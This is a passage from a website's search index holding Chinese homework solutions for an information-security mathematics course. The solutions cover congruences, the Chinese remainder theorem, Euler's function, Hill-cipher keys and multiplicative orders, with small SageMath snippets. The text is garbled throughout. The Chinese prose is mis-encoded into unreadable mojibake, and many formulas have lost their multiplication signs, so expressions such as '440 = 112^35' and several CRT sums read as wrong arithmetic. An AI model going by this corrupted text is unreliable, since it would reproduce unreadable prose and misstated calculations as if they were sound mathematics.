\u0026lt;æ²¡æœ‰è¾“å‡º\u0026gt; æ‰€ä»¥è¯¥åŒä½™æ–¹ç¨‹æ²¡æœ‰è§£\n9 #  å¯ä»¥ç›´æ¥ä½¿ç”¨ gmpy2 ä¸­çš„ invert å‡½æ•°è¿›è¡Œè®¡ç®—ï¼š\nimport gmpy2 print(gmpy2.invert(229, 281)) # mpz(27) å¦å¤–ï¼Œç¬”ç®—å¯ä»¥ä½¿ç”¨æ¬§å‡ é‡Œå¾—æ‰©å±•ç®—æ³•ï¼Œ\nå› ä¸ºè€ƒè™‘åˆ°è´ç¥–ç­‰å¼æˆç«‹ï¼š$$ax + by = gcd(a, b)$$\nä»¤ $$a = 229, b = 281 \\Rightarrow gcd(a, b) =1$$ï¼Œé‚£ä¹ˆ x å³ä¸º a å…³äºæ¨¡ 281 çš„é€†å…ƒï¼š\n$$\\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 1 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 4 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 2 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 2 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix} \\begin{pmatrix} 10 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix} \\begin{pmatrix} 1 \\ 0\\end{pmatrix} â€‹$$\n$$\\Rightarrow \\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 281 \u0026amp; 27\\ 229 \u0026amp; 22\\end{pmatrix}\\begin{pmatrix} 1 \\ 0\\end{pmatrix} \\Rightarrow \\begin{pmatrix} -22 \u0026amp; 27 \\ 229 \u0026amp; -281\\end{pmatrix} \\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 1 \\ 0\\end{pmatrix}$$\nå› æ­¤æˆ‘ä»¬æœ‰ï¼š$$229^{-1} = 27 \\pmod{281}$$\n10 #  è®¾å¯¹äº mï¼š$$\\displaystyle m = 2^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}â€‹$$ï¼Œå…¶ä¸­ $$\\alpha_1â€‹$$ ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä»– $$\\alpha_iâ€‹$$ ä¸ºæ­£æ•´æ•°\næ˜¾ç„¶æœ‰ $$p_i, i = 2,3,\u0026hellip;,s$$ ä¸ºå¥‡æ•°ã€‚\næ ¹æ®æ¬§æ‹‰å‡½æ•°çš„è®¡ç®—æœ‰ï¼š $$\\displaystyle \\phi(m) = m (\\frac{1}{2})^{\\alpha_1\u0026gt;0}\\prod_{i=2}^s (1 - \\frac{1}{p_i}) = m (\\frac{1}{2})^{\\alpha_1\u0026gt;0}\\prod_{i=1}^s \\frac{p_i - 1}{p_i}$$\n è‹¥ $$s \u0026gt; 0â€‹$$ï¼Œé‚£ä»»æ„çš„ iï¼Œæ€»æœ‰ $$p_i \\equiv 1 \\pmod{2}, p_i -1 \\equiv 0 \\pmod{2}â€‹$$ï¼Œæ‰€ä»¥æ­¤æ—¶ $$\\displaystyle \\prod_{i=2}^s \\frac{p_i - 1}{p_i}â€‹$$ æ€»æœ‰ä¸€ä¸ª 2 çš„å› å­ã€‚ è‹¥ $$s =0â€‹$$ï¼Œé‚£ä¹ˆ $$\\displaystyle \\phi(m) = \\frac{m}{2} â€‹$$ï¼Œä¸ºäº†ä½¿ $$ m \u0026gt; 3â€‹$$ï¼Œä¸€å®šæœ‰ $$\\displaystyle \\frac{m}{2}â€‹$$ å­˜åœ¨ 2 çš„å› å­ã€‚  11 #  è®¾å‘½é¢˜ Mï¼š$$\\phi(m)$$ èƒ½è¢« 4 æ•´é™¤ï¼›$$\\overline{M}$$ï¼š$$\\phi(m)$$ ä¸èƒ½è¢« 4 æ•´é™¤ã€‚\n  å…ˆè€ƒè™‘ m ä¸ºå¶æ•°ï¼Œæ ¹æ®ç¬¬åé¢˜çš„è®¨è®ºï¼š$$\\overline{M}$$ ä¸€ä¸ªå¿…è¦æ¡ä»¶æ˜¯ $$\\displaystyle \\frac{m}{2}$$ çš„ç´ å› å­æ•°é‡ä»…ä¸ºä¸€ï¼ˆè‹¥å¤§äº 1 çš„è¯ï¼Œå¿…ç„¶å‡ºç°ä¸¤ä¸ª 2 çš„å› å­ï¼‰ï¼Œåˆ†ç±»è®¨è®ºè¿™ä¸ªç´ å› å­ä¸º 2 çš„æƒ…å†µï¼š\n å¾—åˆ°ä¸€ä¸ªæ›´å¼ºçš„ $$\\overline{M}$$ çš„å¿…è¦æ¡ä»¶ï¼š$$\\displaystyle \\frac{m}{2}$$ æ˜¯ç´ æ•°ã€‚  å†è€ƒè™‘ $$\\overline{M}$$ ä¸€ä¸ªå¿…è¦æ¡ä»¶ï¼š\nä¸è€ƒè™‘ $$\\displaystyle \\frac{m}{2} = 2$$ çš„æƒ…å†µï¼Œä¸ºä½¿ $$\\displaystyle \\frac{m}{2} - 1 \\not\\equiv 0 \\pmod{4}$$ï¼Œå¿…æœ‰ $$\\displaystyle \\frac{m}{2} = 4k+3$$ã€‚\næ‰€ä»¥ï¼š$$m \\in {2k | k = 2 æˆ– k ä¸ºå½¢å¦‚ 4n+3 çš„ç´ æ•°}$$\n  å†è€ƒè™‘ m ä¸ºå¥‡æ•°ï¼ŒåŒæ ·æ ¹æ®ç¬¬åé¢˜çš„è®¨è®ºä¹Ÿèƒ½å¾—åˆ°ï¼Œm çš„ç´ å› å­æ•°é‡ä»…ä¸ºä¸€ï¼Œç»“åˆ m ä¸ºå¥‡æ•°çš„æ¡ä»¶ï¼š\n å¯ä»¥å¾—åˆ°ä¸€ä¸ª $$\\overline{M}$$ çš„å¿…è¦æ¡ä»¶ï¼š$$m$$ æ˜¯ç´ æ•°  å†è€ƒè™‘ä¸€ä¸ªå¿…è¦æ¡ä»¶å¯ä»¥å¾—åˆ°ï¼š$$m = 4k+3$$ã€‚\næ‰€ä»¥ï¼š$$m \\in {k | kä¸ºå½¢å¦‚ 4n+3 çš„ç´ æ•°}$$\n  ç»¼ä¸Šæ‰€è¿°ï¼Œm çš„å–å€¼ç©ºé—´ä¸ºï¼š$${2} \\cup{k, 2k | kä¸ºå½¢å¦‚ 4n+3 çš„ç´ æ•°}$$\n12 #  from sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) solve_mod(27*x == 12, 15), solve_mod(24*x == 6, 81), solve_mod(91*x == 26, 169), solve_mod(71*x == 32, 3441) # ([(6,), (1,), (11,)], # [(7,), (34,), (61,)], # [(4,), (17,), (30,), (43,), (56,), (69,), (82,), (95,), (108,), (121,), (134,), (147,), (160,)], # [(1309,)]) ç¬”ç®—é€šè¿‡ä»¥ä¸‹çš„å®šç†è®¡ç®—ï¼š\n è®¾ $$m \u0026gt; 1, gcd(a, m) =d \u0026gt; 1$$ï¼Œåˆ™åŒä½™æ–¹ç¨‹ $$ax \\equiv b \\pmod{m}$$ æœ‰è§£çš„å……è¦æ¡ä»¶æ˜¯ $$d | b$$ï¼Œå¹¶ä¸”å…¶è§£çš„ä¸ªæ•°ä¸º dï¼Œä¸”è‹¥ $$x \\equiv x_0 \\pmod{m}$$ æ˜¯ä¸€ä¸ªç‰¹è§£ï¼Œåˆ™å®ƒçš„ d ä¸ªè§£ä¸ºï¼š$$\\displaystyle x \\equiv x_0 + \\frac{m}{d}t \\pmod{m}, t = 0,1,\u0026hellip;,d-1$$\n 13 #  å®¹æ˜“å¾—åˆ°ï¼š$$7^{-1} \\equiv 15 \\pmod{26}$$ï¼Œå³ï¼š$$7*15 \\equiv 1 \\pmod{26}$$\n$$y \\equiv 7x + 3\\pmod{26} \\Rightarrow y-3 \\equiv 7x \\pmod{26} \\Rightarrow x \\equiv15y -45 \\pmod{26}$$\nåŒ–ç®€å¾—åˆ°ï¼š$$x \\equiv 15y + 7 \\pmod{26}$$\n14 #   å®šç†ï¼šè®¾ $$m_1, m_2,.., m_k$$ æ˜¯ k ä¸ªä¸¤ä¸¤äº’ç´ çš„æ­£æ•´æ•°ï¼Œè‹¥ä»¤ $$m = m_1 m_2 \u0026hellip;m_k, m = m_iM_i$$ï¼Œåˆ™å¯¹ä»»æ„çš„æ•´æ•° $$b_1, b_2, \u0026hellip;, b_k$$ï¼ŒåŒä½™æ–¹ç¨‹ç»„ï¼š\n$$\\begin{cases}x \\equiv b_1 \\pmod{m_1} \\ x \\equiv b_2 \\pmod{m_2} \\ \u0026hellip; \\x \\equiv b_k \\pmod{m_k} \\end{cases}$$\næœ‰å”¯ä¸€è§£ï¼š$$\\displaystyle x \\equiv \\sum_{i=1}^{k} M_iM_i\u0026rsquo; b_i \\pmod{m}$$ï¼Œå…¶ä¸­ $$M_i M_i\u0026rsquo; \\equiv 1 \\pmod{m_i}$$\n ï¼ˆ1ï¼‰$$x \\equiv 2519 + 12 * 23 * 6 \\equiv 81 \\pmod{300}$$\nï¼ˆ2ï¼‰$$x \\equiv 33015 + 154412 + 1051318 \\equiv 1272\\pmod{2310}$$\nï¼ˆ3ï¼‰\n$$\\begin{cases} x \\equiv 2 \\pmod{9} \\ 3x \\equiv 4 \\pmod{5} \\ 4x \\equiv 3 \\pmod{7} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 2 \\pmod{9} \\ x \\equiv 24 \\pmod{5} \\ x \\equiv 23 \\pmod{7} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 2 \\pmod{9} \\ x \\equiv 3 \\pmod{5} \\ x \\equiv 6 \\pmod{7} \\end{cases}$$\næ‰€ä»¥ $$x \\equiv 3582 + 6323 + 4556 \\equiv 83 \\pmod{315}$$\n15 #  è®¾å£«å…µçš„æ€»äººæ•°ä¸º xï¼Œå³æœ‰æ–¹ç¨‹ç»„ï¼š$$\\begin{cases}x \\equiv 1 \\pmod{3} \\ x \\equiv 2 \\pmod{5} \\ x\\equiv 2 \\pmod{7} \\end{cases}$$\næ ¹æ®ä¸Šé¢æè¿°çš„å®šç†ï¼š$$x \\equiv 3521 + 2112 + 1512 \\equiv 37\\pmod{105}$$\nè€ƒè™‘åˆ° x çš„å–å€¼èŒƒå›´ï¼Œå› æ­¤å…±æœ‰ 37 ä¸ªå£«å…µã€‚\n16 #  å¯¹äº 440ï¼Œæˆ‘ä»¬æœ‰ $$440 = 112^35$$ï¼Œå› æ­¤å¯¹ $$91x \\equiv 419 \\pmod{440}$$ æœ‰ï¼š\n$$\\begin{cases} 91x \\equiv 419 \\pmod{11} \\91x \\equiv 419 \\pmod{8} \\ 91x \\equiv 419 \\pmod{5} \\end{cases} \\Rightarrow \\begin{cases} 3x \\equiv 1 \\pmod{11} \\ 3x \\equiv 3 \\pmod{8} \\ x \\equiv 4 \\pmod{5} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 4 \\pmod{11} \\ x \\equiv 1 \\pmod{8} \\ x \\equiv 4 \\pmod{5} \\end{cases}$$\nåŒæ ·çš„æ ¹æ®ä¹‹å‰çš„å®šç†ï¼š$$x \\equiv 4084 + 5571 + 8824 \\equiv 169 \\pmod{440}$$\n17 #  å³æ±‚åŒä½™æ–¹ç¨‹ç»„ $$\\begin{cases} x \\equiv 0 \\pmod{13} \\ x \\equiv 2 \\pmod{3} \\ x \\equiv 2 \\pmod{5}\\ x \\equiv 2 \\pmod{7} \\ x \\equiv 2 \\pmod{11} \\end{cases}$$ çš„è§£ï¼Œ\nè§£å¾— $$x \\equiv 2*(50051 + 30032 + 21455 + 13651) \\equiv 1157 \\pmod{15015}$$\n18 #  è®¾å…¶ä¸­çš„æœ€åä¸€ä¸ªæ•´æ•°ä¸º xï¼Œå³è§£åŒä½™æ–¹ç¨‹ç»„ï¼š\n$$\\begin{cases}x - 3\\equiv 0 \\pmod{2^2} \\ x -2 \\equiv 0 \\pmod{3^2} \\ x-1 \\equiv 0 \\pmod{5^2} \\ x \\equiv 0 \\pmod{7^2}\\end{cases} \\Rightarrow \\begin{cases}x \\equiv 3 \\pmod{4} \\ x \\equiv 2 \\pmod{9} \\ x \\equiv 1 \\pmod{25} \\ x \\equiv 0 \\pmod{49}\\end{cases} $$\nè§£å¾— $$x \\equiv 105^213 + 70^2 * 7 *2 + 42^2 * 9 *1 \\equiv 29351\\pmod{210^2}$$\næ‰€ä»¥è¿™å››ä¸ªæ•°åˆ†åˆ«ä¸ºï¼š29348, 29349, 29350, 29351\n19 #  ä¹Ÿå°±æ˜¯è¯´æœ‰è¿™æ ·çš„ä¸¤ä¸ªç­‰å¼æˆç«‹ï¼š$$K \\begin{pmatrix} 3 \\ 14\\end{pmatrix} = \\begin{pmatrix} 1 \\ 14\\end{pmatrix}, K \\begin{pmatrix} 2 \\ 19\\end{pmatrix} = \\begin{pmatrix} 11 \\ 21\\end{pmatrix}$$\nå¯¹ K çš„å››ä¸ªæœªçŸ¥æ•°ï¼Œå¯ä»¥åˆ—å‡ºä»¥ä¸‹çš„æ–¹ç¨‹å¼ï¼š$$\\begin{cases} 3a_{11} + 14a_{12} = 1 \\ 3a_{21} + 14a_{22} = 14 \\ 2a_{11} + 19 a_{12} = 11 \\ 2a_{21} + 19 a_{22} = 21\\end{cases}\\pmod{26}$$\nå¯ä»¥ç”±è¿™ä¸ªæ–¹ç¨‹ç»„è§£å‡ºï¼š$$\\begin{cases} a_{11} \\equiv 7 \\ a_{12} \\equiv 19 \\ a_{21} = 8 \\ a_{22} = 3 \\end{cases}$$ï¼Œæ‰€ä»¥è¿™ä¸ªçŸ©é˜µä¸º $$K= \\begin{pmatrix} 7 \u0026amp; 19 \\ 8 \u0026amp; 3\\end{pmatrix}$$\n20 #  from sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) print(solve_mod(3*x**14 + 4*x**13 + 2*x**11 + x**9 +x**6 +x**3 + 12*x**2 + x == 0, 5)) # [(0,), (1,), (2,)] å³ $$x \\equiv 0, 1, 2 \\pmod{5}â€‹$$\nå¦å¤–ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸‹æ–¹æ³•ç¬”ç®—ï¼š\næ³¨æ„åˆ°æ¬§æ‹‰å‡½æ•° $$\\phi(5) = 4$$ï¼Œå› æ­¤æ ¹æ®æ¬§æ‹‰å®šç†æˆ‘ä»¬æœ‰ $$x^{\\phi(5)} \\equiv x^4 \\equiv 1 \\pmod{5}$$\nå› æ­¤åœ¨æ¨¡ 5 çš„æƒ…å†µä¸‹æœ‰ï¼š\n$$3x^{14} + 4x^{13} + 2x^{11} +x^9 + x^6 +x^3 +12x^2 +x \\equiv 0 \\pmod{5} \\Leftrightarrow$$\n$$3x^{2} + 4x^1 + 2x^{3} + x^1 + x^2 +x^3 +2 x^2 +x \\equiv 0 \\pmod{5} \\Leftrightarrow$$\n$$3x^3 + 6x^2 +6x \\equiv 0 \\pmod{5} \\Leftrightarrow x^3 + 2x^2 + 2x \\equiv 0 \\pmod{5}$$\nç©·ä¸¾å°±å®¹æ˜“æ±‚è§£äº†ã€‚\nè¯æ˜é¢˜ #  1 #  è®¾ä¸€ä¸ªæ­£æ•´æ•° n è¡¨ç¤ºä¸ºï¼š$$\\displaystyle n = \\sum_{i=0}^{m}\\alpha_i*10^i$$\né‚£ä¹ˆå³è¯æ˜ $$\\displaystyle n \\equiv 0 \\pmod{3} \\Leftrightarrow \\sum_{i=0}^{m} \\alpha_i \\equiv 0 \\pmod{3}$$\næˆ‘ä»¬çŸ¥é“å¯¹ä»»æ„ iï¼Œæœ‰ï¼š$$10^i \\equiv 1 \\pmod{3}$$ï¼ˆè€ƒè™‘ $$10^i - 1$$ ä¸ 3 çš„æ•´é™¤å…³ç³»ï¼‰\näºæ˜¯æˆ‘ä»¬æœ‰ä»¥ä¸‹ç­‰ä»·å…³ç³»çš„æ¨å¯¼ï¼š\n$$\\displaystyle n = \\sum_{i=0}^{m} (\\alpha_i *(10^i - 1)) + \\sum_{i=0}^{m} \\alpha_i \\equiv 0\\pmod{3} \\Leftrightarrow \\sum_{i=0}^{m}\\alpha_i \\equiv 0 \\pmod{3}$$\næ‰€ä»¥é¢˜å¼å¾—è¯ã€‚\n2 #  è®¾ $$f(x) = 0 $$ æœ‰ä¸€ä¸ªæ•´æ•°è§£ sï¼Œå³ $$f(s) = 0$$ï¼Œè®¾ $$t \\in \\mathbb{Z}_m, s \\equiv t \\pmod{m}$$\nåˆæœ‰ï¼š$$f(1), f(2), \u0026hellip;, f(m) \\not\\equiv 0 \\pmod{m} \\Leftrightarrow f(0), f(1), \u0026hellip;f(m-1) \\not\\equiv 0 \\pmod{m}$$\næ‰€ä»¥æˆ‘ä»¬æœ‰ä»¥ä¸‹çš„æ¨å¯¼ï¼š\n$$\\displaystyle f(s) = 0 \\overset{å¼±åŒ–}{\\Rightarrow} f(s) \\equiv 0 \\pmod{m} \\overset{f(x) æ˜¯æ•´ç³»æ•°å¤šé¡¹å¼}{\\Rightarrow} f(t) \\equiv 0 \\pmod{m}$$\næ³¨æ„åˆ° $$t \\in \\mathbb{Z}_m$$ï¼Œè¿™ä¸ä¸Šé¢çš„æ¨å¯¼æ˜¯çŸ›ç›¾çš„ï¼Œæ‰€ä»¥ $$f(x) = 0$$ ä¸å­˜åœ¨æ•´æ•°è§£ã€‚\n3 #  æˆ‘ä»¬æ³¨æ„åˆ° $$(m-1)^2 - 1^2 = m(m-2) \\equiv 0 \\pmod{m}$$\nè¿™æ„å‘³ç€ï¼š$$(m-1)^2 \\equiv 1^2 \\pmod{m}$$\nè¿™è¿åäº†å®Œå…¨å‰©ä½™ç³»ä¸¤ä¸¤ä¸åŒä½™çš„æ„é€ æ¡ä»¶ã€‚\n4 #  æˆ‘ä»¬å…ˆå‡å®šä¸€ä¸ªä¸éœ€è¦è¯æ˜çš„å®šç†ï¼š\n æ¨¡ m çš„å®Œå…¨å‰©ä½™ç±»å®Œå¤‡åœ°å°† $$\\mathbb{Z}$$ åˆ†å‰²ä¸º m ä¸ªé›†åˆã€‚å³ $$\\forall n \\in \\mathbb{Z}, \\exist C_r, n\\in C_r, r \\in \\mathbb{Z}_m$$  å› ä¸ºï¼Œm ä¸ªæ•´æ•°éƒ½ä¸å±äºæ¨¡ m çš„ 0 å‰©ä½™ç±»ã€‚\né‚£ä¹ˆæ€»å…±æœ‰ m-1 ä¸ªå®Œå…¨å‰©ä½™ç±»ï¼Œå®Œå¤‡åœ°è¦†ç›– m ä¸ªæ•´æ•°çš„å–å€¼ç©ºé—´ã€‚\næ ¹æ®é¸½ç¬¼å®šç†ï¼Œé¢˜å¼æˆç«‹ã€‚\n5 #  è€ƒè™‘è®¾ $$ 1 \\le s \\le t \\le 18$$ï¼Œ\nå…ˆè¯æ˜è¿™æ ·çš„ç»“è®ºï¼š$$s \\equiv t \\pmod{18} \\Leftrightarrow 2^s \\equiv 2^t \\pmod{27}$$\næœ‰ä»¥ä¸‹æ¨å¯¼ï¼š$$2^s \\equiv 2^t \\pmod{27} \\Leftrightarrow 2^s(2^{t-s} - 1) \\equiv 0 \\pmod{27} \\Leftrightarrow 2^{t-s} \\equiv 1 \\pmod{27}$$\n$$\\Leftrightarrow t-s \\equiv 0 \\pmod{\\phi(27)} \\Leftrightarrow t \\equiv s \\pmod{18}$$\næ‰€ä»¥æ ¹æ®åè¯æ³•æœ‰ï¼š$$2, 2^2, 2^3,\u0026hellip;,2^{18}$$ ä¸¤ä¸¤ä¸åŒä½™ï¼Œè€Œæœ‰å¯ä»¥çŸ¥é“æ¨¡ 27 çš„å®Œå…¨å‰©ä½™ç³»å¤§å°ä¸º $$\\phi(27) = 18$$ï¼Œå› æ­¤å¿…æœ‰ $$2, 2^2, 2^3,\u0026hellip;,2^{18}$$ æ„æˆä¸€ä¸ªå®Œå…¨å‰©ä½™ç³»ã€‚\n6 #  å› ä¸º 7 æ˜¯ç´ æ•°ï¼Œæ ¹æ®è´¹é©¬å°å®šç† $$a^7 \\equiv a \\pmod{7}â€‹$$\nåˆå› ä¸º $$gcd(a, 3) = 1 \\Rightarrow gcd(a, 9) = 1â€‹$$ï¼Œæ ¹æ®æ¬§æ‹‰å®šç† $$a^{\\phi(9)} \\equiv 1 \\pmod{9}â€‹$$\nå› æ­¤æˆ‘ä»¬æœ‰ï¼š$$a^7 \\equiv a \\pmod{7}, a^7 \\equiv a \\pmod{9} \\Rightarrow a^7 \\equiv a \\pmod{63}$$\n7 #  è§è§£ç­”é¢˜ç¬¬ä¹é¢˜ã€‚\n8 #  å¯¹äºæ¬§æ‹‰å‡½æ•°çš„åˆ†è§£ $$\\phi(n) = 14 = 2*7$$\næˆ‘ä»¬åˆçŸ¥é“ä»»æ„ $$\\displaystyle m = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$\nå…¶æ¬§æ‹‰å‡½æ•°å¯ä»¥è¡¨ç¤ºæˆä¸ºï¼š$$\\displaystyle \\phi(m) = m \\prod_{i=1}^s (1 - \\frac{1}{p_i}) = \\frac{m}{p_i p_2 \u0026hellip; p_s} \\prod_{i=1}^{s}(p_i - 1)â€‹$$ çš„å½¢å¼ã€‚\nå› ä¸º $$p_iâ€‹$$ å‡ä¸ºç´ æ•°ï¼Œè€Œ $$7+1â€‹$$ ä¸æ˜¯ç´ æ•°ï¼Œ$$\\displaystyle 7 | \\frac{m}{p_1p_2\u0026hellip;p_s} \\Rightarrow 7|m \\Rightarrow 7 \\in {p_{i+1} | i \\in \\mathbb{Z}_s}â€‹$$\næœ‰ $$7-1=6$$ï¼Œä»è€Œï¼š$$\\displaystyle 3 | \\prod_{i=1}^{s}(p_i - 1)$$ï¼Œä¸” $$\\displaystyle \\frac{m}{p_i p_2 \u0026hellip; p_s}$$ æ€»æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œ\nä½† 3 å¹¶ä¸æ•´é™¤ 14ï¼Œè¿™æ˜¯çŸ›ç›¾çš„ï¼Œå› æ­¤ä¸å­˜åœ¨è¿™æ ·çš„æ•°å­— n ä½¿å¾— $$\\phi(n) = 14$$\n9 #  ï¼ˆ1ï¼‰\nå¯¹äºå¥‡æ•° $$a = 2k+1, k \\ge 1$$ï¼Œæ ¹æ®æ¬§æ‹‰å®šç†ï¼Œæˆ‘ä»¬æœ‰ï¼š$$\\displaystyle 2^{\\phi(a)} \\equiv 1 \\pmod{a}$$\nå› ä¸º $$\\phi(a) \\le a-1$$ æ€»æ˜¯æˆç«‹çš„ï¼Œæ‰€ä»¥ $$\\phi(a) = d$$ å³ä¸ºæ‰€æ±‚ã€‚\nï¼ˆ2ï¼‰\nå› ä¸ºæˆ‘ä»¬æœ‰ï¼š$$\\displaystyle 2^{kd_0} - 1 = (2^{d_0} - 1)(\\sum_{i=1}^{k} 2^{d_0(k-i)})$$\n$$\\displaystyle d_0 | h \\Leftrightarrow h = kd_0 \\Leftrightarrow (2^{d_0} - 1)| (2^h -1)$$\nè‡³æ­¤ï¼Œå……åˆ†æ€§æ˜¯åˆ†æ˜¾ç„¶çš„ï¼š $$(2^{d_0} - 1)|(2^h - 1) \\Rightarrow a|(2^h - 1)$$\nå…³äºå¿…è¦æ€§ï¼š\nå¦‚æœ $$d_0$$ ä¸ $$h$$ æœ‰é 1 æœ€å¤§å…¬å› æ•°æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ $$d_0$$ æœ€å°ç›¸æ‚–ã€‚\nå¦‚æœ $$d_0$$ ä¸ h æ˜¯äº’ç´ çš„ï¼Œæ ¹æ® 2.1 ç¬¬ä¹é¢˜çš„è¯æ˜ï¼Œ$$(2^{d_0} - 1) | (2^h -1)$$ ä¸å¯èƒ½æˆç«‹ã€‚\nå› æ­¤æˆ‘ä»¬ç”¨åè¯æ³•è¯æ˜äº†å¿…è¦æ€§ã€‚\n10 #  $$2x^3 - x^2 +3x +11 \\equiv 0 \\pmod{5} \\Leftrightarrow 2x^3 - x^2 +3x -4 \\equiv 0 \\pmod{5}$$\n$$\\Leftrightarrow (x-1)(2x^2 + x + 4) \\equiv 0 \\pmod{5} \\Rightarrow x = 1\\pmod{5} æˆ– 2x^2 + x +4 \\equiv 0 \\pmod{5}â€‹$$\n$$2x^2 + x +4 \\equiv 0 \\pmod{5} \\Leftrightarrow 2x^2 +x -1 \\equiv 0 \\pmod{5} \\Rightarrow (x+1)(2x - 1) \\pmod{5}$$\nç”±æ­¤å¯çŸ¥ä¸‰ä¸ªè§£åˆ†åˆ«ä¸º $$x \\equiv 1, 3, 4 \\pmod{5} â€‹$$\n"},{"id":237,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.1/","title":"3.1","section":"HOMEWORK","content":"3.1 #  è§£ç­”é¢˜ #  1 #  #!/usr/bin/env python2 from sage.all import *  R = IntegerModRing(37) # å»ºç«‹ä¸€ä¸ªæ¨¡ 37 çš„æ•´æ•°ç¯ p = R(34) # å–æ•´æ•°ç¯ä¸Šçš„æ•° 34 print(p.multiplicative_order()) # æ±‚æ¬¡æ•°ï¼ˆhttp://mathonline.wikidot.com/the-order-of-a-permutationï¼‰ 9 å³ï¼Œæˆ‘ä»¬æœ‰ $$34^{9} \\equiv 1 \\pmod{37}$$\næ‰‹ç®—å¯ä»¥å…ˆè®¡ç®— 37 çš„æ¬§æ‹‰å‡½æ•°ï¼š$$\\phi(37) = 36$$\næ ¹æ®æ¬§æ‹‰å®šç†ï¼Œä¸æ¬¡æ•°çš„æ€§è´¨ï¼Œ34 å¯¹æ¨¡ 37 çš„æ¬¡æ•°ä¸€å®šæ˜¯ 36 çš„å› å­ï¼Œç©·ä¸¾å¯å¾— 9ã€‚\n2 #  #!/usr/bin/env python2 from sage.all import *  R = IntegerModRing(37) p = R(2**12) print(p.multiplicative_order()) # 3 å³ï¼Œæˆ‘ä»¬æœ‰ $$\\displaystyle 2^{12*3} \\equiv 1 \\pmod{37}$$\nç¬”ç®—ï¼š\nå¯¹ 2ï¼Œæ ¹æ®æ¬§æ‹‰å®šç†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼š$$2^{36} = 2^{12*3} \\equiv 1 \\pmod{37}$$\nå†å¯¹ 2ï¼Œè€ƒè™‘æ¬¡æ•°çš„æ€§è´¨ï¼š$$24 \\not| 36$$ï¼Œæ‰€ä»¥å¿…æœ‰ $$2^{24} = 2^{12*2} \\not\\equiv 1 \\pmod{37}$$\nå› æ­¤ 3 æ˜¯ $$2^{12}$$ æ¨¡ 37 çš„æ¬¡æ•°ã€‚\n3 #  #!/usr/bin/env python2 from sage.all import *  R = IntegerModRing(61) for i in range(61)[1:]:  p = R(i)  if p.multiplicative_order() == 4:  print(p) # 11 50 ç¬”ç®—ï¼š\n2 æ˜¯æ¨¡ 61 çš„åŸæ ¹ $$\\Leftrightarrow 2^{60} \\equiv 1 \\pmod{61} ä¸” 2^{i} \\not\\equiv 1 \\pmod{61}, i = 1,2,\\dots,59$$\næ˜¾ç„¶æˆ‘ä»¬çŸ¥é“ $$2^{60} = (2^{15})^{4} \\equiv (11)^4 \\equiv (\\pm 11)^4 \\equiv 1 \\pmod{61} $$\nç„¶åå› ä¸ºå¯¹äºä»»æ„ $$i \u0026lt; 4, 15i \u0026lt; 60$$ï¼Œè‹¥ 4 ä¸æ˜¯ 11 çš„æ¬¡æ•°ï¼Œè¿™ä¸ 2 æ˜¯ä¸€ä¸ªåŸæ ¹çŸ›ç›¾ã€‚\nå› æ­¤æˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªæ¬¡æ•°ä¸º 4 çš„æ•´æ•° 11ã€50ã€‚\nç„¶åæˆ‘ä»¬è¯æ˜å®ƒçš„å”¯äºŒæ€§ï¼Œè‹¥ $$\\exist p \\not\\equiv \\pm 11 \\pmod{61}, ord(p) = 4$$\nå¿…æœ‰ $$p^4 \\equiv 11^4 \\pmod{61} \\Leftrightarrow (p^2 +11^2)(p^2 - 11^2) \\equiv 0 \\pmod{61}$$\nå› ä¸ºæˆ‘ä»¬çš„å‡è®¾ï¼Œå¿…æœ‰ $$p^2 + 11^2 \\equiv 0 \\pmod{61} \\Leftrightarrow p^2 \\equiv 1 \\pmod{61}$$\nå­˜åœ¨ä¸€ä¸ª 4 çš„å› å­ 2 ä½¿å¾—æ¬¡æ•°å®šä¹‰å¼æˆç«‹ï¼Œè¿™ä¸ 4 æ˜¯ p çš„æ¬¡æ•°çŸ›ç›¾ã€‚\nå› æ­¤ 11 ä¸ 50 æ˜¯å”¯äºŒçš„æ¬¡æ•°ä¸º 4 çš„æ•´æ•°ã€‚\n4 #  æ ¹æ®ä¸‹é¢çš„å®šç†ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œåˆ™ m çš„åŸæ ¹å­˜åœ¨çš„å……è¦æ¡ä»¶æ˜¯ m ä¸º $$2, 4, p^l, 2p^l$$ ä¹‹ä¸€ï¼Œå…¶ä¸­ $$l \\ge 1,$$ p æ˜¯å¥‡ç´ æ•°ã€‚\n æˆ‘ä»¬é€šè¿‡ä¸€ä¸‹çš„ç¨‹åºåˆ†è§£è¿™ä¸‰ä¸ªæ•°å­—ï¼š\n#!/usr/bin/env sage print(factor(47), factor(55), factor(59)) # (47, 5 * 11, 59) æ ¹æ®å®šç†å¯çŸ¥ï¼Œä»… 55 ä¸æ»¡è¶³åŸæ ¹å­˜åœ¨çš„å……è¦æ¡ä»¶ï¼Œ47 ä¸ 59 éƒ½æ˜¯å¥‡ç´ æ•°ã€‚\nå¯¹äº 47ï¼š$$\\phi(47) = 46 = 2*23, 5^2 \\equiv 4 \\not\\equiv 1 \\pmod{47}, 5^{23} \\equiv 46 